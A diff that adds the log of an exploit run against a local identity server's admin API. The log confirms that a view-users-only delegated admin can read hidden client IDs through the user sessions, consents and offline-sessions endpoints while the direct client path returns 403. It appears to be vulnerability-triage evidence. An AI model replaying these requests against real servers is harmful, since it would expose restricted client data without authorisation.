@@ -1,0 +1,43 @@
+[EXPLOIT] Issue #50981: User session/consent endpoints disclose hidden clients
+[EXPLOIT] Hidden client : 'triage-secret-client' (uuid=4d0e90ff-9faa-462f-8405-25a78383cbd6)
+[EXPLOIT] Victim UUID   : 86df5514-a668-45ca-a5be-79c7f962db91
+[EXPLOIT] Baseline      : direct GET /clients/{id} → HTTP 403 (expect 403)
+[EXPLOIT] Victim session established: True
+[EXPLOIT] Victim offline token:       True
+
+[EXPLOIT] Step 1: Token obtained for 'triage-viewer' (view-users ONLY — no view-clients).
+[EXPLOIT] Step 2: GET /clients/{secret_uuid} (protected path) → HTTP 403 (expect 403).
+[EXPLOIT]         Protected path correctly blocked (403). Proceeding.
+
+[EXPLOIT] Step 3A: GET http://localhost:8080/admin/realms/triage-realm/users/86df5514-a668-45ca-a5be-79c7f962db91/sessions
+[EXPLOIT]          Actor: 'triage-viewer' (view-users only — SHOULD NOT see hidden clients)
+[EXPLOIT]          Response: HTTP 200
+[EXPLOIT]          Response body length: 320 bytes
+[EXPLOIT]          Sessions count: 1
+[EXPLOIT]          Hidden client UUID in sessions response: True
+[EXPLOIT]          CONFIRMED LEAK (sessions): session id='Rlk5fyAN9RsHVF5xSuo7dw9E'
+[EXPLOIT]          clients map contains hidden client: {'4d0e90ff-9faa-462f-8405-25a78383cbd6': 'triage-secret-client'}
+
+[EXPLOIT] Step 3B: GET http://localhost:8080/admin/realms/triage-realm/users/86df5514-a668-45ca-a5be-79c7f962db91/consents
+[EXPLOIT]          Actor: 'triage-viewer' (view-users only — SHOULD NOT see hidden clients)
+[EXPLOIT]          Response: HTTP 200
+[EXPLOIT]          Response body length: 163 bytes
+[EXPLOIT]          Consents count: 1
+[EXPLOIT]          Hidden client in consents response: True
+[EXPLOIT]          CONFIRMED LEAK (consents): hidden client id/name in consents payload
+
+[EXPLOIT] Step 3C: GET http://localhost:8080/admin/realms/triage-realm/users/86df5514-a668-45ca-a5be-79c7f962db91/offline-sessions/4d0e90ff-9faa-462f-8405-25a78383cbd6
+[EXPLOIT]          Actor: 'triage-viewer' (view-users only — should require view-clients)
+[EXPLOIT]          Response: HTTP 200
+[EXPLOIT]          Response body length: 320 bytes
+[EXPLOIT]          Offline sessions: [{'id': '_m6FHamJh6mInCxCffsneS-P', 'username': 'triage-victim', 'userId': '86df5514-a668-45ca-a5be-79c7f962db91', 'ipAddress': '192.168.127.1', 'start': 1784663025000, 'lastAccess': 1784663025000, 'rememberMe': False, 'clients': {'4d0e90ff-9faa-462f-8405-25a78383cbd6': 'triage-secret-client'}, 'transientUser': False}]
+[EXPLOIT]          CONFIRMED LEAK (offline-sessions): hidden client data returned to viewer
+
+
+========================================================================
+VERDICT: CONFIRMED — VULNERABILITY ACTIVE
+confirmed: true
+Evidence: GET /users/{id}/sessions → HTTP 200: hidden client uuid/id in clients map; GET /users/{id}/consents → HTTP 200: hidden client uuid/clientId in consent list; GET /users/{id}/offline-sessions/{clientUuid} → HTTP 200: hidden client offline session exposed
+Reason:   Hidden client data exposed to view-users-only delegated admin via user subresource endpoints. Direct /clients/{id} correctly returns HTTP 403.
+========================================================================
+RESULT: {"phase": "exploit", "confirmed": true, "verdict": "CONFIRMED", "http_status_sessions": 200, "http_status_consents": 200, "http_status_offline": 200, "http_status_direct": 403, "hidden_client_uuid_leaked": true, "evidence": ["GET /users/{id}/sessions \u2192 HTTP 200: hidden client uuid/id in clients map", "GET /users/{id}/consents \u2192 HTTP 200: hidden client uuid/clientId in consent list", "GET /users/{id}/offline-sessions/{clientUuid} \u2192 HTTP 200: hidden client offline session exposed"], "reason": "User subresource endpoints (sessions/consents/offline-sessions) returned HTTP 200 to a view-users-only delegated admin and exposed hidden client UUIDs or clientIds. The direct /clients/{id} path correctly returned HTTP 403, confirming the FGAP per-client visibility filter is not applied to user session/consent subresources."}
